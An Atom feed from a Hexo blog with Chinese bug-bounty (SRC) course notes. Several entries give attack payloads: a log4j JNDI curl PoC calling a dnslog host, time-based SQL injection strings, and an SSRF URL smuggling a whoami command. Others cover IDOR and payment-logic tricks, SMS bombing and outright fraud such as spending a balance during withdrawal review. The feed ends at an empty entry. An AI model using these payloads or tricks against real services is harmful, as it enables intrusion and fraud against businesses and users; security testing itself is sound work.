<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Scammer</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-12-25T08:56:59.478Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Bron</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SRC_cource_16</title>
    <link href="http://example.com/2023/12/24/SRC_cource_16/"/>
    <id>http://example.com/2023/12/24/SRC_cource_16/</id>
    <published>2023-12-23T16:00:00.000Z</published>
    <updated>2023-12-25T08:56:59.478Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>2023漏洞新课</p><span id="more"></span><h1 id="SRC漏洞挖掘类型"><a href="#SRC漏洞挖掘类型" class="headerlink" title="SRC漏洞挖掘类型"></a>SRC漏洞挖掘类型</h1><p>移动安全漏洞，IOT漏洞，web安全漏洞（常规漏洞挖掘，逻辑漏洞挖掘，nday漏洞利用），隐私合规，威胁情报，二进制漏洞。</p><p>众测平台：补天众测，漏洞盒子，雷神众测，火线，360众测</p><p>企业SRC：阿里SRC，腾讯SRC，百度SRC，字节SRC，快手SRC，丁香园SRC，联想SRC</p><h1 id="burp插件"><a href="#burp插件" class="headerlink" title="burp插件"></a>burp插件</h1><ol><li>验证码识别</li><li>APIKit</li><li>Authz</li><li>Autorize</li><li>BSPE</li><li>BurpBountyPlus</li><li>BurpExtender</li><li>BurpFakeIP</li><li>Chunked coding converter</li><li>DataExtractor</li><li>Domain Hunter</li><li>FastJson</li><li>FastjsonScan</li><li>Fiora</li><li>HaE</li><li>HTTP Request Smuggler</li><li>HttpHeadmodfer</li><li>J2EEScan</li><li>JSON Web Tokens</li><li>JSONP-Hunter</li><li>knife</li><li>log4j</li><li>log4j-2</li><li>Passive Scan Client</li><li>reflector</li><li>shiro</li><li>software-vulnerability-scanner</li><li>sqlmap4burp-plus-plus</li><li>Struts2-RCE</li><li>Unexpected_information</li><li>wooyun-payload</li></ol><h1 id="越权绕过小技巧"><a href="#越权绕过小技巧" class="headerlink" title="越权绕过小技巧 /"></a>越权绕过小技巧 <code>/</code></h1><p>场景： <code>/rest/manage</code> 系列的接口不能被普通用户访问<br>在url处加&#x2F;绕过: <code>https://xx.com/manage//ad</code></p><h1 id="子主账号越权"><a href="#子主账号越权" class="headerlink" title="子主账号越权"></a>子主账号越权</h1><p>主账号点击编辑，抓包 <code>/gw/kdb/scpfour/GroupBuySearchService/queryFoodProductByProductId</code><br>抓包子账号，保留cookie，替换cookie，并且重放数据包，发现依旧能够获取到相同的数据</p><p>即可证明子账号能够越权访问优惠套餐数据</p><h1 id="提交漏洞选择编辑器还是附件"><a href="#提交漏洞选择编辑器还是附件" class="headerlink" title="提交漏洞选择编辑器还是附件"></a>提交漏洞选择编辑器还是附件</h1><p>XSRC模板系列的SRC建议直接附件提交，因为难用。在编辑器中提醒审核见附件。</p><p>其它的建议在编辑器写，必须在编辑器写的是ASRC，不要附件。</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;2023漏洞新课&lt;/p&gt;</summary>
    
    
    
    <category term="SRC" scheme="http://example.com/categories/SRC/"/>
    
    
    <category term="SRC" scheme="http://example.com/tags/SRC/"/>
    
  </entry>
  
  <entry>
    <title>SRC_cource_14</title>
    <link href="http://example.com/2023/12/22/SRC_cource_14/"/>
    <id>http://example.com/2023/12/22/SRC_cource_14/</id>
    <published>2023-12-21T16:00:00.000Z</published>
    <updated>2023-12-22T15:03:18.694Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>课程内部月度分享。SRC内容补充，其它关于护网逆向的内容就再看一遍课好了。</p><span id="more"></span><h1 id="常见的ueditor"><a href="#常见的ueditor" class="headerlink" title="常见的ueditor"></a>常见的ueditor</h1><p>常见目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/ueditorutf8</span><br><span class="line">/ueditor</span><br><span class="line">/static/ueditor</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.xxx.com/ueditorutf8/net/controller.ashx?action=config</span><br><span class="line">https://www.xxx.com/ueditorutf8/net/controller.ashx?action=catchimage</span><br><span class="line">参考url：https://www.cnblogs.com/hei-zi/p/13394764.html</span><br></pre></td></tr></table></figure><h1 id="VmwareHorizonClient-log4j"><a href="#VmwareHorizonClient-log4j" class="headerlink" title="VmwareHorizonClient log4j"></a>VmwareHorizonClient log4j</h1><p>POC:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -vv -H &quot;Accept-Language: \$&#123;jndl:ldap://j9qf9g.dnslog.cn:1207/lol&#125;&quot; --insecure https://xx.com</span><br></pre></td></tr></table></figure><p>查看dnslog有无回显，有回显则说明存在漏洞</p><h1 id="cas认证"><a href="#cas认证" class="headerlink" title="cas认证"></a>cas认证</h1><p>比如一些swaggerUI的接口，在swaggerUI中发包，返回无法获取<br>或者一些在Findsomething中找到一些接口，访问发现未经认证<br>就可以找认证服务，如sso和cas<br>其中cas可以爆破<br>Authorization: Basic base64<br>可以使用burp进行爆破<br>4版本可以rce</p><p>SSO平台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/public/pages/login/index.html?backurl=http://xxx.com/Account/Login/ReturnUrl=/&amp;app=test</span><br><span class="line">替换为</span><br><span class="line">http://xxx.com/public/pages/login/index.html?backurl=http://替换.com/Account/Login/ReturnUrl=/&amp;app=test</span><br></pre></td></tr></table></figure><h1 id="美团虚拟地址白嫖会员"><a href="#美团虚拟地址白嫖会员" class="headerlink" title="美团虚拟地址白嫖会员"></a>美团虚拟地址白嫖会员</h1><p>用虚拟地址更改定位。</p><h1 id="安卓客户端漏洞"><a href="#安卓客户端漏洞" class="headerlink" title="安卓客户端漏洞"></a>安卓客户端漏洞</h1><ol><li><p>使用drozer对 xx app Android版进行扫描，执行以下命令，获取APP导出组件<br><code>run app.activity.info -a ddns.android.vuls</code></p></li><li><p>通过分析，发现调用相机功能的组件 <code>com.xx.xx.xx.CameraActivity</code> 被导出<br>执行以下命令可直接调用相机权限，打开相机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start --component com.xx.xx</span><br><span class="line">com.xx.xx.xx.CameraActivity</span><br></pre></td></tr></table></figure><p>…后续省略，详见课程</p></li></ol><p>原理：不具备某一权限的恶意app，通过调用第三方app（该app含有某权限漏洞），进行权限申请操作。实现从无权限到有权限的过程。</p><p>开源安卓APP漏洞案例详情<br><code>https://securitylab.github.com/advisories/GHSL-2021-1033_Nextcloud_News_for_Android</code></p><h2 id="APP渗透测试比web多的部分"><a href="#APP渗透测试比web多的部分" class="headerlink" title="APP渗透测试比web多的部分"></a>APP渗透测试比web多的部分</h2><ol><li><p>环境检测对抗<br>magisk + lsposed<br><code>https://mp.weixin.qq.com/s/oQau4pqXUfn2Wryo7vXGRQ</code><br>(建议使用真手机测试，二手买一个)</p></li><li><p>抓包对抗（代理检测型）<br><code>https://mp.weixin.qq.com/s/DoCxqBTIGWzFR9eETOLzJQ</code><br>代理工具：iptables, proxifier, postern, stream<br>不走代理（通过代码逻辑实现）</p></li></ol><p>安卓7.0以下，直接导入burp证书是安装在用户目录，被信任。<br>安卓7.0以上，证书默认不被信任。解决方法：将证书移动到系统根目录。</p><p>绕过方式：<br>单向证书校验：justtrustme（基于lsposed）, frida脚本<br>双向证书校验：r0caputre, hooker, 定制rom，直接反编译源码</p><p>body乱码 –&gt; gzip –&gt;基于hook抓包 –&gt; frida</p><ol start="3"><li>加解密对抗<br>frida –&gt; r0tracer, objection<br>xposed –&gt; lnspeckage<br>直接逆向获取源码 –&gt; 脱壳</li></ol><h1 id="登录接口的暴力破解"><a href="#登录接口的暴力破解" class="headerlink" title="登录接口的暴力破解"></a>登录接口的暴力破解</h1><p>描述：登录接口用户名和密码都进行了加密处理，经过测试发现没有进行次数限制和验证码处理逻辑，因此这里有暴力破解漏洞。<br>加密算法：通过前端JS进行分析得出为：DES Pkcs7 加密算法<br>牛刀：实现DES加密的算法，对字典进行加密，使用密文进行批量枚举</p><h1 id="订单越权-amp-邮件地址IDOR"><a href="#订单越权-amp-邮件地址IDOR" class="headerlink" title="订单越权&amp;邮件地址IDOR"></a>订单越权&amp;邮件地址IDOR</h1><p>描述：好多业务都有报告导出的功能<br>POST请求的数据包体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Orderid=123&amp;Type=.pdf&amp;DownType=email&amp;Email=xxx@xxx.com</span><br></pre></td></tr></table></figure><p>正常逻辑：订单号对应到具体的人，这个人后台设置了绑定的邮箱，因此只能推送到该用户的邮箱才对，也即订单号&amp;邮箱地址绑定的逻辑。</p><p>漏洞：未校验orderid，绑定关系</p><h1 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h1><p>描述：漏洞存在于订单预览的页面，请求如下：<br><code>https://app.example.com/OrderDialog/DataEntry?orderId=2004140011&amp;IsShanghaiVolkswagen=0&amp;type=view</code><br>一般这种请求就分析：订单号枚举越权&amp;SQL注入漏洞<br>payloads:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&quot; or sleep(5)=&quot;</span><br><span class="line">&#x27; or sleep(5)=&#x27;</span><br><span class="line">1) or sleep(5)#</span><br><span class="line">&quot;) or sleep(5)&quot;</span><br><span class="line">&#x27;) or sleep(5)&#x27;</span><br><span class="line">1)) or sleep(5)#</span><br><span class="line">&quot;)) or sleep(5)=&quot;</span><br><span class="line">&#x27;)) or sleep(5)=&#x27;</span><br><span class="line">;waitfor delay &#x27;0:0:5&#x27;--</span><br><span class="line">);waitfor delay &#x27;0:0:5&#x27;--</span><br></pre></td></tr></table></figure><p>sqlmap跑</p><h1 id="加密算法bypass"><a href="#加密算法bypass" class="headerlink" title="加密算法bypass"></a>加密算法bypass</h1><p>描述：订单预览的界面，发现订单号加密了，其加密算法为对称加密，无法获取密钥，也就无法解密。<br>请求：<br><code>https://app.example.com/DataEntry/OrderView?orderId=QUdjalfaljDSAFOjwdoiad</code></p><p>经过分析请求数据包发现加密接口<br><code>https://sapp.example.com/Common/EncryptText?text=2004140008</code></p><p>推测：该功能应该是为了防止通过订单号枚举越权访问而采用的安全措施。</p><h1 id="Js-map文件到越权漏洞"><a href="#Js-map文件到越权漏洞" class="headerlink" title="Js.map文件到越权漏洞"></a>Js.map文件到越权漏洞</h1><p>描述：后端程序对请求包体进行了签名校验，因此更改任何数据包都会导致签名校验失败</p><p>webpack打包：<code>https://app.example.com/app.js.map</code><br>源代码还原： <code># reverse-sourcemap --output-dir test app.js.map</code></p><h1 id="验证码绕过到任意-手机-x2F-邮箱轰炸"><a href="#验证码绕过到任意-手机-x2F-邮箱轰炸" class="headerlink" title="验证码绕过到任意-手机&#x2F;邮箱轰炸"></a>验证码绕过到任意-手机&#x2F;邮箱轰炸</h1><p>描述：每次触发验证码都触发图形验证码逻辑</p><p>删除头部的 <code>&quot;x&quot;:114</code> 元素即可批量发送</p><h1 id="信息泄露到OSS-Bucket接管"><a href="#信息泄露到OSS-Bucket接管" class="headerlink" title="信息泄露到OSS Bucket接管"></a>信息泄露到OSS Bucket接管</h1><p>描述：请求包返回加密的云凭证信息</p><h1 id="不一样的任意用户"><a href="#不一样的任意用户" class="headerlink" title="不一样的任意用户"></a>不一样的任意用户</h1><p>描述：用户注册，用户登录验证码本地回显[adb logcat 抓取触发验证码]</p><p>破解方法：验证码发到app里，在burp中无法抓包</p><h1 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h1><p>小程序抓包，购买参数，将数量改为小数，总价变少</p><h1 id="SSRF-RCE"><a href="#SSRF-RCE" class="headerlink" title="SSRF+RCE"></a>SSRF+RCE</h1><p>利用技巧： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com?url=http://`whoami`.teibgj.dnslog.cn</span><br></pre></td></tr></table></figure><p>先执行 <code>whoami</code> 命令，再执行ping命令，优先级前者高。</p><h1 id="二次注入绕过"><a href="#二次注入绕过" class="headerlink" title="二次注入绕过"></a>二次注入绕过</h1><p>在用户名或手机号后加空格，即使账号存在重名也可能能注册成功。<br>示例：<br>账号： <code>admin </code><br>手机号： <code>15300000000 </code></p><h1 id="更改文件类型解析"><a href="#更改文件类型解析" class="headerlink" title="更改文件类型解析"></a>更改文件类型解析</h1><p>场景：原本只允许解析pdf文件<br>修改：将文件内容和后缀改为html</p><h1 id="微信小程序反编译"><a href="#微信小程序反编译" class="headerlink" title="微信小程序反编译"></a>微信小程序反编译</h1><p>首先找到微信小程序，在 设置-文件管理 找到小程序文件。<br>解密工具：</p><ol><li>使用 PC微信小程序一键解密 By:代码果 工具</li><li>wxapkgconvertor</li><li>小锦哥小程序工具（全部集成）</li></ol><h1 id="众测项目"><a href="#众测项目" class="headerlink" title="众测项目"></a>众测项目</h1><h2 id="众测项目特点"><a href="#众测项目特点" class="headerlink" title="众测项目特点"></a>众测项目特点</h2><ol><li>项目周期短 - 基本为3-30天</li><li>奖金相对丰厚 - 最低标准（低危100，中危500，高危1000）</li><li>项目难度低，资产多（基础漏洞多）</li><li>竞争激烈 - 大项目基本上为多家竞测</li><li>金融项目较多，国有银行+股份制银行+城商、农商行+各大证券</li></ol><h2 id="项目分类"><a href="#项目分类" class="headerlink" title="项目分类"></a>项目分类</h2><ol><li>有测试范围的众测 - 从测试范围找脆弱资产</li><li>全互联网资产的众测 - 外包系统-&gt;小程序-&gt;公众号-&gt;主域名系统-&gt;APP</li><li>红队项目众测 - 不建议投入大量精力</li><li>每个月都有的特定目标众测 - 不建议参加</li></ol><h2 id="寻找外包系统"><a href="#寻找外包系统" class="headerlink" title="寻找外包系统"></a>寻找外包系统</h2><p>以邮储银行为例，对目标进行命名分析：</p><ol><li>中国邮政储蓄银行</li><li>邮储银行</li><li>邮储</li><li>邮政储蓄银行</li><li>邮政储蓄</li><li>英文缩写：1、POSTAL SAVINGS BANK OF CHINA 2、psbc</li><li>中文缩写：1、 youchu 2、ycyh 3、yzcxyh 4、yzcx</li></ol><p>语法：</p><ol><li>title</li><li>domain</li><li>body</li></ol><h2 id="hunter使用技巧"><a href="#hunter使用技巧" class="headerlink" title="hunter使用技巧"></a>hunter使用技巧</h2><ol><li>默认列出一个月，改为一年</li><li>有些没有站点标题的也要点进去看，可能有东西</li><li>有些时候可以排除香港台湾</li><li>筛选出国家可获得更精准数据</li><li>可从域名排名和icon排名排除掉大量目标外的站点</li><li>使用此语法可快速模糊搜索出邮储的外包系统: <code>domain=&quot;psbc&quot; and domain!=&quot;psbc.com&quot;</code></li></ol><h2 id="基于调用hunter和fofa，省去了点击IP的步骤-小工具"><a href="#基于调用hunter和fofa，省去了点击IP的步骤-小工具" class="headerlink" title="基于调用hunter和fofa，省去了点击IP的步骤 小工具"></a>基于调用hunter和fofa，省去了点击IP的步骤 小工具</h2><p><code>https://github.com/0x727/Space_view</code></p><h2 id="指纹识别快速getshell"><a href="#指纹识别快速getshell" class="headerlink" title="指纹识别快速getshell"></a>指纹识别快速getshell</h2><p>使用语法搜索-导出下载-指纹识别-过滤<br>指纹识别: <code>https://github.com/0x727/ObserverWard</code><br>命令: <code>observer_ward.exe -f dom.txt -c dom.csv</code></p><h1 id="订单-支付漏洞"><a href="#订单-支付漏洞" class="headerlink" title="订单-支付漏洞"></a>订单-支付漏洞</h1><ol><li>订单id与账号没有绑定，替换订单id购买便宜内容</li><li>订单无过期，生成多个订单</li><li>在订单id中找到订单价格为0的订单id，替换购买，无支付页面显示，直接完成订单</li></ol><h1 id="注册漏洞"><a href="#注册漏洞" class="headerlink" title="注册漏洞"></a>注册漏洞</h1><p>场景：<br>企业注册<br>需要填写企业名称，统一信用代码，手机号，登录密码，确认密码，图形验证码，短信验证码。</p><p>在网上随便找一家公司，填入企业名称和统一信用代码，手机号和密码自己填。登录进入后是一个企业内部账号，手机号不是自己的。</p><h1 id="利用加密越权"><a href="#利用加密越权" class="headerlink" title="利用加密越权"></a>利用加密越权</h1><p>场景：<br>请求包和返回包中都有vendorCode，请求包的是加密的，返回包的是解密的。<br>有上传附件功能，在请求包中有fileRelatId，发现fileRelatId和vendorCode加密很像</p><p>利用方式：利用fileRelatId，在返回包中找到未加密的fileRelatId，将其改为自己想加密的内容，然后加密出自己想要的vendorCode。</p><h1 id="隐藏参数越权"><a href="#隐藏参数越权" class="headerlink" title="隐藏参数越权"></a>隐藏参数越权</h1><p>场景：<br>注册，抓包，有userId, mobile等各种注册信息。</p><p>利用方式：将uid置空，出现隐藏参数。返回包显示“uid，mobile和userid不能同时为空”。由于请求包中无mobile参数，于是将请求包中的uid参数删除，改为mobile参数，手机号使用企业内部手机号。</p><p>因为公司内部手机号是批量给员工发的，所以对员工手机号的后3位进行爆破。得到大量注册信息。</p><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>发现url中存在ueditor，利用nday找到编辑器漏洞SSRF即可。</p><h1 id="隐藏接口越权"><a href="#隐藏接口越权" class="headerlink" title="隐藏接口越权"></a>隐藏接口越权</h1><p>使用findsomething<br>找到空页面，抓包发现有查询字段，查询接口可以使用，即可越权。</p><h1 id="凌风云百度网盘"><a href="#凌风云百度网盘" class="headerlink" title="凌风云百度网盘"></a>凌风云百度网盘</h1><p>搜索出信息泄露，比如: 京东 合同，小米 合同<br>修复建议：以官方身份给百度网盘发邮件，删除内容。</p><h1 id="短信轰炸"><a href="#短信轰炸" class="headerlink" title="短信轰炸"></a>短信轰炸</h1><p>最后再测，以免手机号废掉。<br>payload：抓包在手机号后面加“,1” “+” 之类的。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;课程内部月度分享。SRC内容补充，其它关于护网逆向的内容就再看一遍课好了。&lt;/p&gt;</summary>
    
    
    
    <category term="SRC" scheme="http://example.com/categories/SRC/"/>
    
    
    <category term="SRC" scheme="http://example.com/tags/SRC/"/>
    
  </entry>
  
  <entry>
    <title>SRC_cource_15</title>
    <link href="http://example.com/2023/12/22/SRC_cource_15/"/>
    <id>http://example.com/2023/12/22/SRC_cource_15/</id>
    <published>2023-12-21T16:00:00.000Z</published>
    <updated>2023-12-25T08:57:00.591Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学员0-1分享课程。从中汲取一点新东西。</p><span id="more"></span><h1 id="2022-6-4"><a href="#2022-6-4" class="headerlink" title="2022.6.4"></a>2022.6.4</h1><h2 id="信息泄露方面"><a href="#信息泄露方面" class="headerlink" title="信息泄露方面"></a>信息泄露方面</h2><ol><li><p>google hack<br>site:<br>filetype:<br>intext:</p></li><li><p>.git泄露<br>githack.py<br>地址：<br><code>https://github.com/lijiejie/GitHack</code><br>使用方法：<br><code>GitHack.py http://www.openssl.org/.git/</code></p></li><li><p>svn泄露subversion源码管理工具<br>.svn&#x2F;entries<br>直接在后面加上上面的东西<br>或者用下面的工具<br><code>https://github.com/admintony/svnExploit</code></p></li><li><p>spring（大多不收）<br>spring接口泄露</p></li><li><p>.bashrc个人配置记录<br>&#x2F;.ssh&#x2F;authorized–keys<br>&#x2F;.bash–history<br>泄露站点服务器j记录</p></li><li><p>sql报错语句泄露</p></li><li><p>xray（谨慎使用）</p></li><li><p>dirsearch</p></li><li><p>测试环境漏洞挖掘<br>公告给的</p></li><li><p>威胁情报获取<br>工具搜<br><code>https://www.lingfengyun.com/</code><br>合同<br>设计图纸<br>身份证<br>通讯录<br>搜索引擎搜<br>疑似被黑赌博信息</p></li><li><p>DS_store (mac生产文件的位置信息可以用dirsearch找到这个漏洞通过工具python2下载源码)<br><code>https://github.com/lijiejie/ds_store_exp</code><br>druid未授权访问（阿里数据库连接池）<br>未授权访问路径<br>html:<br>ip&#x2F;druid&#x2F;index.html</p></li></ol><p>##Druid sql监控页面<br>ip&#x2F;druid&#x2F;weburi.html<br>##Druid Web URI监控页面<br>ip&#x2F;druid&#x2F;websession.html<br>##Druid Web Session监控页面<br>json:<br>ip&#x2F;druid&#x2F;weburi.json<br>##Druid Web URI json<br>ip&#x2F;druid&#x2F;websession.json<br>##Druid Web Session json<br>Druid 登录接口：<br>ip&#x2F;druid&#x2F;login.html<br>##Druid登录认证页面</p><p>谷歌语法查询<br>site:xx.com intitle:Druid Stat Index</p><h2 id="登录口"><a href="#登录口" class="headerlink" title="登录口"></a>登录口</h2><ol><li><p>万能密码<br>F12看返回包有没有<br>js中看路径可不可以拼接<br>xhr和xml中有没有存取密码</p></li><li><p>代码审计<br>信息泄露的源代码<br>git<br>svn</p></li><li><p>nday攻击<br>CMS识别<br>看框架打<br>spring<br>struct<br>看返回包里面的</p></li><li><p>撞库<br>手机号撞库<br>账号密码撞库<br>社工库撞库</p></li><li><p>暴力破解用户名密码<br>可爆破多次也算漏洞<br>注册验证已存在账号<br>用户名密码错误<br>通过注册验证出已注册<br>再进行爆破</p></li><li><p>账号权限绕过<br>改参数绕过<br>未授权拼接js绕过</p></li><li><p>验证码爆破和绕过<br>有直接回显<br>可重用验证</p></li><li><p>注入<br>sql注入<br>get参数注入<br>post注入<br>html注入</p></li><li><p>信息泄露或未授权<br>js拼接<br>getsomething</p></li><li><p>目录扫描<br>DDOS<br>验证码图片DDOS</p></li></ol><h2 id="深入业务"><a href="#深入业务" class="headerlink" title="深入业务"></a>深入业务</h2><ol><li>网站业务线流程梳理，搞清楚业务线之间的联系</li><li>跳出用户视角</li></ol><h2 id="新姿势分享"><a href="#新姿势分享" class="headerlink" title="新姿势分享"></a>新姿势分享</h2><ol><li>密保密码找回场景<br>抓包，直接删除POST内容</li></ol><h1 id="2022-6-11"><a href="#2022-6-11" class="headerlink" title="2022.6.11"></a>2022.6.11</h1><h2 id="反向并发"><a href="#反向并发" class="headerlink" title="反向并发"></a>反向并发</h2><p>挖掘并发漏洞时，不一定要让点赞增加，可以让点赞减少。</p><h2 id="危害角度转变"><a href="#危害角度转变" class="headerlink" title="危害角度转变"></a>危害角度转变</h2><p>场景：看广告视频，每次能获得100金币，每天最多能看10次广告。<br>操作：同时并发10次看广告视频，减少看广告视频的时间获得1000金币。（只能并发10次）<br>危害：减少看广告，减少广告商的流量，导致广告商不再此平台投放广告，造成平台广告收入数十万到数百万的损失。（中危）</p><h2 id="绕过关注限制发图片"><a href="#绕过关注限制发图片" class="headerlink" title="绕过关注限制发图片"></a>绕过关注限制发图片</h2><p>场景：聊天框中需要互相关注才能使用图片&#x2F;拍照功能，如果判断没有互相关注，则无法发送。<br>操作：抓包修改参数isFollowing从False改为True。<br>危害：批量打广告，骚扰用户。</p><h2 id="突破购买限制达到锁定库存的目的"><a href="#突破购买限制达到锁定库存的目的" class="headerlink" title="突破购买限制达到锁定库存的目的"></a>突破购买限制达到锁定库存的目的</h2><p>场景：A商品一个用户只能买50个，库存最大数量为996个。<br>操作：提交订单时，将数量修改为996个。达到持续锁定库存的目的。<br>危害：通过提交订单锁定库存，其他人无法购买，导致商家经营遭受损失。</p><h1 id="2022-6-25"><a href="#2022-6-25" class="headerlink" title="2022.6.25"></a>2022.6.25</h1><ol><li><p>半价购买<br>场景：购买云产品。<br>操作：将数量修改为0.5，达到半价购买目的。</p></li><li><p>币种替换<br>场景：原本是按USD购买，参数为priceUSD<br>操作：将priceUSD改为priceCNY，替换币种减少金钱。</p></li><li><p>修改赠送物品<br>场景：购买一件A商品后，赠送了B，C物品。<br>操作：将B，C物品的数量参数增大。结果获得更多物品。</p></li><li><p>0元购的修改点<br>在一个类似于淘宝的电商环境中，首先尝试在加入购物车时抓包修改数量参数，然后尝试在购物车中修改数量的位置抓包修改数量参数，最后尝试在提交订单时抓包修改数量参数。也即每个点都要进行测试。</p></li><li><p>手机号修改<br>在手机号前面加0，加+，或者进行编码等等。</p></li><li><p>变相0元购<br>场景：余额有3元，可提现但是通过人工审核。<br>操作：先提现，在人工审核期间赶紧把钱花光。最后达到既提现又花钱的目的。</p></li><li><p>更改url达到0元购目的<br>场景：购买一件带时间限制的产品，url中存在参数sixmonths, years等时间参数。<br>操作：购买years时间的产品，实际更改为sixmonths，达到0元购目的。原因是后面藏了时间参数标价为0</p></li><li><p>免费抽奖<br>场景：下单购买一件商品，赠送一次抽奖活动。<br>操作：购买商品后抽奖，再进行退货。获得免费抽奖的目的。</p></li><li><p>假漏洞也要提交<br>假漏洞即指的无实际危害的漏洞。比如下单购买一件商品，修改参数后价格为0元，但是实际无法支付，这个就是假漏洞。<br>提交后仍有可能通过。</p></li><li><p>同一接口不同价格<br>有的网站在不同页面使用同一接口充值，但是A方式和B方式价格不同，或是相同价格下数量不同。逻辑不一致。</p></li></ol><h1 id="2022-8-18"><a href="#2022-8-18" class="headerlink" title="2022.8.18"></a>2022.8.18</h1><ol><li>优惠券可遍历<br>场景：在电商平台中，分为两种优惠券，一种是平台发放的优惠券，一种是商家发放优惠券。具体参数示例如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot;extensions&quot;:&#123;</span><br><span class="line">&quot;CHOOSE_PLATFORM_VOUCHER_ID&quot;:&quot;102220604141051000000&quot;,</span><br><span class="line">&quot;_platformVoucherParams&quot;:&#123;</span><br><span class="line">&quot;alias&quot;:&quot;270p8xgtullsloj&quot;,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>操作：其中，CHOOSE参数可以遍历，观察可知是以时间发放的优惠券，那么可以造成注册商家后无限使用平台优惠券达到薅羊毛的行为。</li></ol><h1 id="2022-10-22"><a href="#2022-10-22" class="headerlink" title="2022.10.22"></a>2022.10.22</h1><h2 id="验证码加参数"><a href="#验证码加参数" class="headerlink" title="验证码加参数"></a>验证码加参数</h2><p>height&#x3D;1111<br>h&#x3D;1111<br>size&#x3D;1111<br>margin&#x3D;1111</p><h1 id="2022-11-6"><a href="#2022-11-6" class="headerlink" title="2022.11.6"></a>2022.11.6</h1><h2 id="挖洞小思路"><a href="#挖洞小思路" class="headerlink" title="挖洞小思路"></a>挖洞小思路</h2><p>挖SRC的时候，在一个站挖出了一些常规漏洞，可以将该站的favicon.ico保存下来，丢到fofa中，然后刷一遍，增加额外收获。</p><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>注入不一定都在小型src，某些大公司的src也有注入，src的注入payload也不一定很难。有些简单的payload都能直接达到效果，可以试试，不一定在边缘域名，主站也可能存在。</p><ol><li>手挖</li><li>用payload（高频: 0%27XOR(if(now()&#x3D;sysdate()%2Csleep(3)%2C0))XOR%27Z ）</li><li>使用扫描器（少用）</li></ol><p>常出现的：报错注入，时间盲注，get和post都有，数据包(Referer)里。</p><p>burp插件推荐：<code>https://github.com/smxiazi/xia_sql</code></p><p>注意：</p><ol><li>SQL注入能够看到库名即可提交。</li><li>如果有dba权限，可以直接提升漏洞等级。</li></ol><p>发现sql注入后常用的注入语句：<br><code>if((length(database())=8),5,0)</code><br><code>if((mid(database(),1,1)=&#39;y&#39;),5,0)</code><br><code>if(ord(substr(database(),1,1))&gt;120,5,0)</code></p><p>测试是否存在SQL注入的方式：<br>在参数位置1’  1&#x2F;0  @@  1&#x2F;1</p><p>代理IP池：爱加速</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;学员0-1分享课程。从中汲取一点新东西。&lt;/p&gt;</summary>
    
    
    
    <category term="SRC" scheme="http://example.com/categories/SRC/"/>
    
    
    <category term="SRC" scheme="http://example.com/tags/SRC/"/>
    
  </entry>
  
  <entry>
    <title>SRC_course_13</title>
    <link href="http://example.com/2023/12/19/SRC_course_13/"/>
    <id>http://example.com/2023/12/19/SRC_course_13/</id>
    <published>2023-12-18T16:00:00.000Z</published>
    <updated>2023-12-20T11:18:42.648Z</updated>
    
